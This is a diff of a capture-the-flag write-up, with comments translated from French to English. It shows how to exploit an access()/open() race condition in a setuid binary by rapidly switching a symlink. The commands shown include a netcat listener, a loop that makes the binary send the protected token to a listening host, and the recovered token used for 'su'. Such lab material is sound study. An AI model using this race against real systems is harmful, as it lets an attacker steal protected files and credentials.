@@ -1,24 +1,22 @@
-# on arrive sur le home on a encore un binaire et un fichier token sans les droits requis pour l'ouvrir
-# j'essaie de lancer le binaire et on a un usage
+# on our home, we have the same setup as level 08
+# Lets do the same routine, exec the binary
 
 ./level10 file host
 
-# il nous dis qu'il envoie le contenue de fichier a host si il peut l'ouvrir
-# j'essaie donc avec token
+# It say that the binary will send the content of the file to host if you have the appropriate right 
+# Let's try with token
 
 ./level10 ./token 10.11.200.200
 >>> You don't have access to ./token
 
-#Je lance ltrace sur le binaire (il n'est pas protege contre le tracage) et je vois qu'il fais appelle a la fonction
-# access
+# I try to ltrace the binary (it's not protected hurray !!! ) and i see that it make a call to access 
 
-#En lisant le man de access, j'apprend qu'il existe une faille exploitable de race condition quand on utilise cette
-# fonction afin de protege un open
+#while reading the access man, I saw that you can exploit it by using a method called "Race condition" when we use this function to protect an open call (as here)
 
-#Une race condition consiste a changer rapidement le pointage d'un lien symbolique entre un fichier dont nous avons les
-# droits et le fichier bloque afin qu'access nous renvoie true mais qu'open ouvre le bon fichier
+#A race condition consist to give a symbolic link to the binary and then switch his target really fast.
+#Once in a while the symbolic link will target a custom empty file with all permission required during the access() call and target the token file for the open() call
 
-# pour cela je cree un petit exploit avec des appelle systeme pour cree et supprimer des liens symboliques
+#Let's make a little exploit :
 
 void main()
 {
@@ -32,19 +30,19 @@ void main()
 	}
 }
 
-# je compile et ouvre ensuite 2 autres terminaux, un pour lancer un listener netcat
+# Compile and then open 2 shell, one for the netcat listener :
 
 nc -k -l 6969
 
-# et un autre pour lancer le binaire en boucle
+# And the other one to execute the binary over and over
 
 while true; do ./level10 /tmp/azur/coucou 10.11.200.200; done;
 
-# une fois le binaire lancer on peut executer l'exploit
+# We are all set up, let's run our exploit
 
 /tmp/azur/a.out
 
-# sur le terminal ou il y a nc on obtiens quelque fois
+# On the listener side we sometimes get : 
 
 .*( )*.
 .*( )*.
@@ -60,7 +58,7 @@ woupa2yuojeeaaed06riuj63c
 .*( )*.
 .*( )*.
 
-#voici notre token
+# our token appears !!
 
 su flag10
 woupa2yuojeeaaed06riuj63c
